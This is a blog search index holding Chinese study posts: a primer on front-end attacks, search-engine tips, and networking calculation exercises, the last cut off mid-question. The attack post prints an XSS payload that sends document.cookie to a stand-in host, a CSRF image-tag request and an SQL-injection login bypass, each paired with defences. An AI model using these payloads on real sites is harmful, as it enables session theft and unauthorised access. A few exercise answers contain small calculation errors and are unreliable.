<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>前端攻击技术</title>
      <link href="/posts/b582fb66.html"/>
      <url>/posts/b582fb66.html</url>
      
        <content type="html"><![CDATA[<h2 id="跨站脚本攻击（XSS）">跨站脚本攻击（XSS）</h2><h3 id="概念">概念</h3><p>跨站脚本攻击（Cross-Site Scripting, XSS），是将代码注入到用户浏览的网页上，注入的内容可以是HTML或者JavaScript。利用了用户对网站的信任。</p><h3 id="原理">原理</h3><ul><li><p>假设现在有一评论区域，用户可以在上面发布内容（即UGC），评论的内容会被渲染在一个<code>&lt;p&gt;</code>标签内，若攻击者输入如下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;//domain.com/?c=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>那么在其他用户的页面上则会渲染成：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;//domain.com/?c=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>页面在渲染时加载了其中的js代码，被迫访问<code>domain.com</code>并携带上了当前作用域的Cookie信息，那么<code>domain.com</code>这个站点就可以得到用户的Cookie数据，从而造成Cookie的泄露。如果该站点可以通过Cookie管理登录状态，那么攻击者就可以通过这个Cookie使用被攻击者的账号进行操作。</p></li></ul><h3 id="预防手段">预防手段</h3><ol><li><p>设置Cookie为HttpOnly</p><p>当Cookie被设置为<code>HttpOnly</code>时，这个Cookie将不能被客户端的JavaScript访问，那么攻击者将无法使用JS获取到用户的Cookie数据，从而保护Cookie信息。</p></li><li><p>过滤特殊字符</p><p>将特殊字符比如<code>&lt;</code>转义为<code>&amp;lt;</code>，将<code>&gt;</code>转义为<code>&amp;gt;</code>等，从而避免攻击者输入HTML和JavaScript代码的执行</p></li><li><p>定义标签白名单和黑名单</p><p>如果用户可以使用富文本编辑器发布代码内容，就不能简单将<code>&lt;</code>转义为<code>&amp;lt;</code>之类，这时可以将具有攻击价值的标签转义，比如表单<code>&lt;form&gt;</code>、脚本<code>&lt;script&gt;</code>之类，而无需转义如<code>&lt;p&gt;</code>、<code>&lt;span&gt;</code>之类的标签。</p></li></ol><h2 id="跨站请求伪造（CSRF）">跨站请求伪造（CSRF）</h2><h3 id="概念-2">概念</h3><p>跨站请求伪造（Cross-site request forgery，CSRF）通过挟制用户在曾经认证过的Web应用程序上（比如邮箱网页端）执行非本意的操作（比如发邮件）从而完成攻击，利用了网站对用户浏览器的信任（因为浏览器保留了用户的登录信息），使其认为是用户本人在进行操作。</p><h3 id="原理-2">原理</h3><ul><li><p>假设某家邮箱使用URL参数的方式进行邮件发送，格式如下：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://example-email.com/send?to=</span>[<span class="string">收信邮箱</span>]&amp;content=[发送内容]</span><br></pre></td></tr></table></figure></li><li><p>攻击者可以将这种地址藏在论坛，博客等任何有用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施，用户即使访问熟悉的可信网站也有受攻击的危险。比如，如果攻击者在一个网站上留下这样的内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://example-email.com/send?to=example@email.com&amp;content=帮我转账1000元给账户1234568&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>而用户恰好使用该邮箱平台且处于登录状态，那么就会以用户的名义给<code>example@email.com</code>发送一封内容为<code>帮我转账1000元给账户1234568</code>的邮件。</p></li></ul><h3 id="预防手段-2">预防手段</h3><ol><li><p>添加校验Token</p><p>在使用敏感接口时，使用无法伪造的数据进行验证，例如服务器在表单中附加一个生成随机数，在提交时需要回传这个随机数。</p></li><li><p>检查 Referer 首部字段</p><ul><li><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源在同一个域名下，可以有效防范 CSRF 攻击。</p></li><li><p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p></li></ul></li><li><p>输入验证码</p><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作，从而避免非用户本人进行的操作。</p></li></ol><h2 id="SQL注入">SQL注入</h2><h3 id="概念-3">概念</h3><p>攻击者通过写下非法的SQL语句，传送到服务器使服务端进行了非法的SQL查询。</p><h3 id="原理-3">原理</h3><ul><li><p>假设某个站点的后端使用如下操作逻辑完成登录：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlStr = <span class="string">&quot;SELECT * FROM users WHERE (username=&#x27;&quot;</span> + userName + <span class="string">&quot;&#x27;) AND (password=&#x27;&quot;</span> + password +<span class="string">&quot;&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure></li><li><p>如果攻击者分别填入如下内容：</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username：<span class="string">&quot;1&#x27;</span> OR <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&quot;</span></span><br><span class="line">password：<span class="string">&quot;1&#x27;</span> OR <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>那么在服务端的SQL查询字符串为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlStr = <span class="string">&quot;SELECT * FROM users WHERE (username = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;) AND (password = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>这条语句等价于：<code>SELECT * FROM users;</code>，从而查询出所有用户的信息数据。</p></li></ul><h3 id="预防手段-3">预防手段</h3><ol><li><p>使用参数化查询</p><p>比如Java中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PreparedStatement</span> <span class="variable">stmt</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;SELECT * FROM users WHERE userid=? AND password=?&quot;</span>);</span><br><span class="line">stmt.setString(<span class="number">1</span>, userid);</span><br><span class="line">stmt.setString(<span class="number">2</span>, password);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery();</span><br></pre></td></tr></table></figure></li><li><p>单引号转换</p><p>将传入的参数中的单引号转换为连续两个单引号，使UGC内容区域的单引号自闭和。</p></li></ol><h2 id="拒绝服务攻击DoS">拒绝服务攻击DoS</h2><ul><li><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p></li><li><p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻击技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何使用搜索引擎？</title>
      <link href="/posts/e82d7e38.html"/>
      <url>/posts/e82d7e38.html</url>
      
        <content type="html"><![CDATA[<h2 id="站点搜索">站点搜索</h2><p>使用<code>site</code>可以准确搜索指定站点的数据，比如仅查看Github上的Vue相关内容：<code>vue site:github.com</code>。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240705102036099.png" alt="站点搜索"></p><h2 id="（文件）类型指定">（文件）类型指定</h2><p>使用<code>filetype</code>可以搜索指定文件类型的内容，比如查找Vue学习相关的pdf文档：<code>Vue学习 filetype:pdf</code>。</p><ul><li>百度支持的类型：ppt、xls、doc、rtf、pdf和all（表示搜索所有支持的文件类型）</li><li>谷歌支持的类型：ppt、xls、doc、rtf、swf、pdf、kmz、kml、ps、def等，更多详见<a href="https://developers.google.com/search/docs/crawling-indexing/indexable-file-types?hl=zh-cn">Google 编入索引的文件类型</a></li></ul><p><img src="https://oss.iuoyt.com/img/posts/image-20240705102438722.png" alt="（文件）类型指定"></p><h2 id="标题搜索">标题搜索</h2><p>使用<code>intitle</code>可以搜索标题中出现的关键词，比如想知道搜索引擎的使用技巧为标题的搜索相关的文章：<code>高级搜索 intitle:搜索引擎使用技巧</code>。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240705103753930.png" alt="标题搜索"></p><h2 id="搜索排除">搜索排除</h2><p>使用<code>-</code>可以排除出现某个关键词的内容，比如：<code>Java学习路线  -黑马程序员</code>。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240705104802826.png" alt="搜索排除"></p><h2 id="精确搜索">精确搜索</h2><p>使用<code>&quot;&quot;</code>可以精确搜索指定的关键词，而不对关键词进行分析重组，同时严格按照关键词的先后顺序筛选。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240705105813468.png" alt="精确搜索"></p><h2 id="模糊搜索">模糊搜索</h2><p>使用<code>*</code>可以对模糊词进行替代，比如只记得一部分的内容，希望搜索完整内容时。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240705110722324.png" alt="模糊搜索"></p><h2 id="数字范围">数字范围</h2><p>使用<code>....</code>可以对指定范围的数字进行搜索。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240705111344748.png" alt="数字范围"></p><h2 id="同时包含">同时包含</h2><p>使用<code>AND</code>可以指定需要同时包含的多个关键词。</p><p><img src="./20240705-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%EF%BC%9F.assets/image-20240705111556780.png" alt="同时包含"></p><h2 id="选择包含">选择包含</h2><p>使用<code>OR</code>可以指定某个可以被互相替换的关键词，仅需包含其中一个。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240705111923997.png" alt="选择包含"></p><h2 id="时间范围">时间范围</h2><p>使用<code>before</code>或<code>after</code>可以指定某个时间范围，检索特定时间的内容。</p><p><img src="./20240705-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%EF%BC%9F.assets/image-20240705112220246.png" alt="时间范围"></p>]]></content>
      
      
      <categories>
          
          <category> 实用技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搜索引擎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络计算题练习</title>
      <link href="/posts/9bdadf86.html"/>
      <url>/posts/9bdadf86.html</url>
      
        <content type="html"><![CDATA[<h2 id="常见单位换算">常见单位换算</h2><ul><li><p>时间转换：</p>  <div class="note info flat"><p>$1s=10^3ms=10^6\mu s(us)$</p></div></li><li><p>数据大小：</p>  <div class="note info flat"><p>$1Byte=8bit$</p><p>$1TB=10^3GB=10^6MB=10^9KB=10^{12}B$</p></div></li></ul><h2 id="第一章-概述">第一章 概述</h2><h3 id="时延">时延</h3><ul><li>时延是指一个报文或分组从网络的一端传送到另一端所需要的时间，其单位是秒（s）、毫秒（ms）、微秒（μs）等。</li><li>总时延=发送时延+传播时延+处理时延+排队时延</li></ul><h4 id="发送时延ts">发送时延ts</h4><ul><li>发送时延（传输时延）：主机或路由器发送数据帧所需要的时间。也就是从发送数据帧的第一个比特算起，到该帧的最后一个比特发送完毕所需的时间。</li><li>$发送时延=\frac{数据帧长度(bit)}{发送速率(bps)}$</li></ul><ol><li><p>一个10MB数据块在传输数率为1Mbps的信道上发送，则发送时延为？</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>发送时延：$\frac{10\times2^{20}\times8bit}{10^6bps}=83.89s$</p>              </div>            </details></li></ol><h4 id="传播时延tp">传播时延tp</h4><ul><li><p>传播时延：电磁波在信道中传播一定的距离而花费的时间。 信号传输速率（即发送速率）和信号在信道上的传播速率是完全不同的概念。</p>  <div class="note info flat"><p>电磁波在真空（空气）中的传播速率为$3\times10^8m/s$，在电缆中的传播速率要比在真空中的略低，约为$2.3\times10^8m/s$，在光纤中的传播速率约为$2.0×10^8m/s$</p></div></li><li><p>$传播时延=\frac{信道长度(m)}{信号在信道上的传播速率(m/s)}$</p></li></ul><ol><li><p>求1000km长的光纤线路带来的传播时延？</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>传播时延：$\frac{10^6m}{2.0\times10^8m/s}=5\times10^{-3}s=5ms$</p>              </div>            </details></li><li><p>收发两端之间的传输距离为1000km，信号在媒体上的传播速率为$2×10^8m/s$。试计算以下两种情况的发送时延和传播时延：</p><p>（1） 数据长度为$10^7bit$,数据发送速率为$100kb/s$。</p><p>（2） 数据长度为$10^3bit$,数据发送速率为$1Gb/s$。</p><p>（3）从上面的计算中可以得到什么样的结论？</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <ol><li><p>发送时延：$ts=\frac{10^7bit}{10^5bps}=100s$</p><p>传播时延：$tp=\frac{10^6m}{2\times10^8m/s}=5\times10^{-3}s=5ms$</p></li><li><p>发送时延：$ts=\frac{10^3bit}{10^9bps}=1\mu s$</p><p>传播时延：$tp=\frac{10^6m}{2\times10^8m/s}=5\times10^{-3}s=5ms$</p></li><li><p>结论：若数据长度大而发送速率低，则总时延中，发送时延往往大于传播时延。但若数据长度短而发送速率高，则传播时延就可能是总时延中的主要成分。</p></li></ol>              </div>            </details></li></ol><h4 id="时延带宽积">时延带宽积</h4><img src="https://oss.iuoyt.com/img/posts/image-20240628140146974.png" alt="时延带宽积" style="zoom:33%;" /><ul><li>$时延带宽积=传播时延\times带宽$</li><li>链路的时延带宽积又称为以比特为单位的链路长度。</li></ul><h3 id="信道利用率">信道利用率</h3><img src="https://oss.iuoyt.com/img/posts/image-20240628143044625.png" alt="信道利用率" style="zoom: 33%;" /><ul><li>$主机甲的信道利用率=\frac{数据帧发送时延}{从发送数据开始到收到确认帧的总时间}=\frac{a}{2a+2b}$</li></ul><h3 id="综合计算题">综合计算题</h3><ol><li><p>假设信号在媒体上的传播速度为$2×10^8m/s$，媒体长度L分别为：</p><p>（1）10cm（网络接口卡）（2）100km（城域网）</p><p>试计算出当数据率为1Mb/s和1Gb/s时在以上媒体中正在传播的比特数。</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <ol><li><p>传播时延：$tp=\frac{0.1m}{2\times10^8m/s}=5\times10^{-10}s$</p><p>1Mb/s比特数：$5\times10^{-10}s\times10^6bps=5\times10^{-4}bit$</p><p>1Gb/s比特数：$5\times10^{-10}s\times10^9bps=0.5bit$</p></li><li><p>传播时延：$tp=\frac{10^6m}{2\times10^8m/s}=5\times10^{-4}s$</p><p>1Mb/s比特数：$5\times10^{-4}s\times10^6bps=5\times10^2bit$</p><p>1Gb/s比特数：$5\times10^{-4}s\times10^9bps=5\times10^5bit$</p></li></ol>              </div>            </details></li><li><p>长2KM、数据传输率为10Mbps的基带总线LAN，信号传播速度为200m/us，试计算：1000比特的帧从发送开始到接收信号结束的最大时间是多少？</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>发送时延：$ts=\frac{1000bit}{10\times10^6bps}=10^{-4}s=100us$</p><p>传播时延：$tp=\frac{2\times10^3m}{200m/us}=10us$</p><p>总时间：$ts+tp=110us=1.1\times10^{-4}s$</p>              </div>            </details></li><li><p>长度为100字节的应用层数据交给传输层传送，需加上20字节的TCP首部。再交给网络层传送，需加上20字节的IP首部。最后交给数据链路层的以太网传送，加上首部和尾部共18字节。试求数据的传输效率？若应用层数据长度为1000字节，数据的传输效率是多少？</p> <div class="note info flat"><p>数据的传输效率是指发送的应用层数据除以所发送的总数据（即应用数据加上各种首部和尾部的额外开销）。</p></div> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <ol><li>$\frac{100}{100+20+20+18}=63.3$%</li><li>$\frac{1000}{1000+20+20+18}=94.5$%</li></ol>              </div>            </details></li><li><p>使用 HTTP、 TCP、 IP 和以太网协议栈的网络发送一个1000字节的用户消息。每个协议头是 20 个字节长。使用此消息将使网络带宽的使用率达到多少？<br>A、7%<br>B、93%<br>C、6%<br>D、94%</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>B</p><p>一共添加四次协议头，$\frac{1000}{1000+20\times4}=92.5$%</p>              </div>            </details></li><li><p>假定1km长的CSMA/CD网络的数据率为1Gb/s。设信号在网络上的传播速率为200000km/s。求能够使用此协议的最短帧长。</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>对于 1km 电缆，单程传播时间为$\frac{1km}{2\times10^5km/s}=5us$，往返传播时间为10us。</p><p>为了能够按照CSMA/CD工作，最小帧的发射时间不能小于10us。</p><p>以1Gb/s速率工作，10us可以发送的比特数等于：$10\times10^{-6}s\times10^9bps=10^4bit$。</p><p>因此，最短帧是10000 位或 1250 字节长</p>              </div>            </details></li><li><p>10Mbps以太网其最短有效帧长是（）字节？<br>A. 46<br>B.48<br>C.64<br>D.128</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>C</p><p>10 Mbit/s 以太网（传统以太网）取 51.2 μs 为争用期的长度，在争用期内可发送 512 bit，即 64 字节。</p>              </div>            </details></li><li><p>考虑一个最大距离为2km的局域网，当带宽等于多大时传播时延（传播速度为$2×10^8m/s$）等于100B分组的发送时延？<br>A、20Mbit/s<br>B、80Mbit/s<br>C、40Mbit/s<br>D、160Mbit/s</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>B</p><p>发送时延$ts=\frac{100B\times8}{带宽}$</p><p>传播时延$tp=\frac{2\times10^3m}{2\times10^8m/s}=10^{-5}s$</p><p>由$ts=tp$得带宽为$8\times10^7bps=80Mbps$</p>              </div>            </details></li></ol><h2 id="第二章-物理层">第二章 物理层</h2><ol><li><p>对于某带宽为4000Hz的低通信道，采用16种不同的物理状态来表示数据。按照奈奎斯特定理，信道的最大传输速率是（    ）？<br>A. 4kbit/s<br>B. 8kbit/s<br>C. 16kbit/s<br>D. 32kbit/s</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>D</p><p>根据奈氏定理，本题中$W=4000Hz$，最大码元传输速率$=2W=8000Baud$</p><p>16种不同的物理状态可表示为$\log_216=4bit$数据，即一码元携带4bit数据，所以信道的$最大传输速率=8000\times4=32kbit/s$</p>              </div>            </details></li><li><p>已知某信道的信号传输速率为64kbps，一个载波信号码元有4个有效离散值，则该信道的波特率为（    ）？<br>A. 16kBaud<br>B. 32kBaud<br>C. 64kBaud<br>D. 128kBaud</p> <div class="note info flat"><p>一个码元若取$2^n$个不同离散值，则含有n bit的信息量</p></div> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>B</p><p>一个波信号含有2bit的信息，波特率为$\frac{64}{2}=32kBaud$</p>              </div>            </details></li><li><p>若某通信链路的数据传输速率为2400bit／s，采用4相位调制，则该链路的波特率是（    ）<br>A、4800<br>B、600<br>C、1200<br>D、2400</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>C</p><p>采用4个相位，有4种不同状态组合，则一个码元可携带2bit信息量，波特率为$\frac{2400}{2}=1200Baud$</p>              </div>            </details></li><li><p>电话系统的典型参数是信道带宽为3000Hz，信噪比为30dB，则该系统的最大数据传输速率为（    ）。<br>A. 3kbit/s<br>B. 6kbit/s<br>C. 30kbit/s<br>D. 64kbit/s</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>C</p><p>信噪比$30dB=10\log_{10}(S/N)$，可解出$S/N=1000$。</p><p>根据香农定理$C=W log_2(1+S/N) b/s$</p><p>所以信道的最大数据传输速率：$3000\times log_2(1+1000)\approx30kbit/s$</p>              </div>            </details></li><li><p>若连接R2和R3链路的频率带宽为8kHz，信噪比为30dB，该链路实际数据传输速率约为理论最大数据传输速率的50%，则该链路的实际数据传输速率约是多少？<br>A、20kbps<br>B、40kbps<br>C、80kbps<br>D、8kbps</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>B</p><p>信噪比$30dB=10\log_{10}(S/N)$，所以$S/N=1000$。</p><p>根据香农定理$C=W log_2(1+S/N) b/s$</p><p>所以信道的最大数据传输速率：$8000\times log_2(1+1000)\approx80kbps$​</p><p>实际速率为$40kbps$</p>              </div>            </details></li></ol><h2 id="第三章-数据链路层">第三章 数据链路层</h2><h3 id="首尾标记法中的位填充">首尾标记法中的位填充</h3><ul><li><p>每一帧使用一个特殊的位模式“01111110”作为开始和结束标记。该位模式又称为“flag”。</p></li><li><p>在首尾标记法中，由于数据中可能会出现与标记相同的位串，从而干扰帧的正常定界。比特(位)填充法可用于解决上述问题。即发送端在数据中若遇到5个连续的“1”时，则在其后自动插入一个“0”。该技术简称“逢五1插0”；接收端则忽略5个连续的“1”后面的“0”，简称“逢五1删0” 。</p>  <img src="https://oss.iuoyt.com/img/posts/image-20240628145400494.png" alt="首尾标记法中的位填充" style="zoom:33%;" /></li></ul><ol><li><p>内容：10011 01110 11111 01001 11111 10010，实际发送和实际接收如何做处理？</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <ol><li><p>在收尾添加开始和结束标记：</p><p><span style="color:blue">01111110</span> 100110111011111010011111110010 <span style="color:blue">01111110</span>（发送数据）</p></li><li><p>0比特插入：</p><p><span style="color:blue">01111110</span> 100110111011111<span style="color:red"><u>0</u></span>010011111<span style="color:red"><u>0</u></span>110010 <span style="color:blue">01111110</span>（实际发送、实际接收）</p></li><li><p>0比特删除：</p><p><span style="color:blue">01111110</span> 100110111011111010011111110010 <span style="color:blue">01111110</span>（接收数据）</p></li></ol>              </div>            </details></li><li><p>在采用零比特填充的链路层传输中，比特串0111101111110装帧发送出去的串为（   ）<br>A、011110111110100<br>B、01111011111010<br>C、0111101111110<br>D、00111101111110</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：B</p></div></div></li></ol><h3 id="循环冗余码CRC（多项式校验）">循环冗余码CRC（多项式校验）</h3><ul><li>工作原理：模2除法，将余式作为冗余信息传送（冗余码FCS：帧检验序列）</li><li>选定的生成多项式（生成码）作为除数，在发送序列后添加生成多项式位数减一个0作为被除数，列竖式计算余数，则为冗余码。</li></ul><ol><li><p>发送的二进制序列：110011（$x^5+x^4+x+1$），选取生成多项式：11001（$x^4+x^3+1$）<br>（1）求冗余码和发送序列<br>（2）判断接收码字为1100111001时的正确性</p><details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <ol><li><p>①被除式为：1100110000（$x^9+x^8+x^5+x^4$）</p><p>②列式计算</p> <img src="https://oss.iuoyt.com/img/posts/image-20240628153544771.png" alt="image-20240628153544771" style="zoom: 50%;" /><p>③冗余码：1001，发送序列：110011 1001</p><ol start="2"><li>用接收到的帧除以生成码（模2运算），被除数是1100111001，除数P=11001，结果余数为0，所以码字正确。</li></ol></li></ol>              </div>            </details></li><li><p>一串数据10111110111011001使用CRC校验方式，已知校验使用的二进制数为110101，生成多项式是什么？发送序列是什么？</p><details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <ol><li>$x^5+x^4+x^2+1$</li><li>10111110111011001 <span style="color:red">00101</span></li></ol>              </div>            </details></li><li><p>接收到的信息为101101001，生成多项式$G(X)=x^3+x^2+1$​，则余数为（），是否有差错（）？</p><details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <ol><li>011</li><li>有</li></ol>              </div>            </details></li></ol><h3 id="交换机的两种用法">交换机的两种用法</h3><img src="https://oss.iuoyt.com/img/posts/image-20240628153801420.png" alt="交换机两种用法" style="zoom:50%;" /><ul><li><p>端口下接站点：站点独占10Mbps带宽</p><p>端口下接网段：网段中所有站点共享10Mbps带宽</p></li></ul><ol><li><p>假如10个站通过一个10Mb/s的集线器相连，每一个站平均得到的带宽为（）bps？如10个站通过一个100Mb/s的交换机相连，每一个站能得到的带宽为（ ）bps？</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <ol><li>通过集线器相连，各个站共享带宽，分别$1Mbps=10^6bps$</li><li>直连交换机，各个站独享完整带宽，$100Mbps=10^8bps$</li></ol>              </div>            </details></li><li><p>某一速率为100M的交换机有20个端口，则每个端口的传输速率为（）？</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：5M</p></div></div></li></ol><h3 id="交换机的自学习算法">交换机的自学习算法</h3><ol><li><p>分析完成如下过程后，S1和S2的交换表内容分别是什么？</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240628153926609.png" alt="自学习算法"></p><ul><li>A 向 B 发送了一帧</li><li>C 向 E 发送了一帧</li><li>E 向 A 发送了一帧</li></ul> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p><img src="https://oss.iuoyt.com/img/posts/image-20240628154053421.png" alt="image-20240628154053421"></p>              </div>            </details></li></ol><h2 id="第四章-网络层">第四章 网络层</h2><h3 id="IP数据报的分片与重组">IP数据报的分片与重组</h3><ol><li><p>一个数据报长度为1420字节（固定首部长度）。现在经过一个网络传送，但此网络能够传送的最大数据长度是620字节。<br>（1）应当划分为几个短些的数据报片<br>（2）各数据报片的数据字段长度、片偏移字段、MF标志和DF标志为何数值？</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <ol><li><p>分3个数据报片</p></li><li><p>片1数据字段长度600字节，片偏移0，MF=1，DF=0</p><p>片2数据字段长度600字节，片偏移75，MF=1，DF=0</p><p>片3数据字段长度200字节，片偏移150，MF=0，DF=0</p><p><img src="https://oss.iuoyt.com/img/posts/image-20240628155626004.png" alt="image-20240628155626004"></p></li></ol>              </div>            </details></li><li><p>一个数据报长度为4000字节（固定首部长度）。现在经过一个网络传送，但此网络能够传送的最大数据长度是1500字节。<br>（1）应当划分为几个短些的数据报片<br>（2）各数据报片的数据字段长度、片偏移字段和MF标志为何数值？</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <ol><li><p>分3个数据报片</p></li><li><p>片1数据字段长度1480字节，片偏移0，MF=1</p><p>片2数据字段长度1480字节，片偏移1480/8=185，MF=1</p><p>片3数据字段长度1020字节，片偏移2960/8=370，MF=0</p></li></ol>              </div>            </details></li><li><p>一总长度为3680的字节数据报，需要经由MTU为1420字节的链路传送，第一个分片的MF为（），第二个分片的片偏移为（）。</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <ol><li><p>1</p></li><li><p>175</p></li></ol><table><thead><tr><th>分片号</th><th>字段长度</th><th>片偏移</th><th>MF</th></tr></thead><tbody><tr><td>1</td><td>1400</td><td>0</td><td>1</td></tr><tr><td>2</td><td>1400</td><td>175</td><td>1</td></tr><tr><td>3</td><td>860</td><td>350</td><td>0</td></tr></tbody></table>              </div>            </details></li></ol><h3 id="划分子网">划分子网</h3><ol><li><p>一企业内部网IP为192.168.1.0/24，最大一个部门需要30台主机，请问该如何划分。</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>$2^5-2=30$，所以5位主机位，3位子网划分位。<br>子网掩码为：255.255.255.224<br>$2^3=8$，所以可划分8个子网：<br>192.168.1.0<br>192.168.1.32<br>192.168.1.64<br>192.168.1.96<br>192.168.1.128<br>192.168.1.160<br>192.168.1.192<br>192.168.1.224</p>              </div>            </details></li><li><p>假如正在构建一个有22个子网的B类网络，但不久后该网络有可能会增至80个子网，同时每个子网要求支持至少300个主机，那么应该选择下面哪个子网掩码？（   ）<br>A、255.255.0.0<br>B、 255.255.254.0<br>C、255.255.255.0<br>D、255.255.248.0</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>B</p><p>$2^9-2\gt300$​，所以9位子网位。</p><p>$(11111110)_2=254$</p><p>子网掩码为：255.255.254.0</p>              </div>            </details></li><li><p>IP地址为140.111.0.0的B类网络，若要切割为9个子网，而且都要连上Internet，需要将子网掩码设为（）</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>255.255.240.0</p><p>$2^4-2\gt9$​，所以4位子网位。</p><p>$(11110000)_2=240$</p><p>子网掩码为：255.255.240.0</p>              </div>            </details></li><li><p>IP地址212.110.24.169/27所在子网段的网络地址是（   